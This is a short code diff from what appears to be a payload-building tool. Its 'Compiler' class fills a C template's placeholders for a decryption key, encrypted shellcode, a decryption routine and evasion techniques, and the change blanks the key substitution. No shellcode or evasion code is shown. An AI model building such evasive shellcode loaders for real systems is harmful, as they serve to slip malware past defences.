@@ -160,7 +160,7 @@ class Compiler:
         """Read the C template and substitute all PLACEHOLDER comments."""
         source = self._read_template(template_path)
         substitutions = {
-            "/* PLACEHOLDER: decryption_key */": code.get("encryption_code", ""),
+            "/* PLACEHOLDER: decryption_key */": "",
             "/* PLACEHOLDER: encrypted_shellcode */": "",
             "/* PLACEHOLDER: decryption_routine */": code.get("encryption_code", ""),
             "/* PLACEHOLDER: evasion_techniques */": "\n".join(filter(None, [
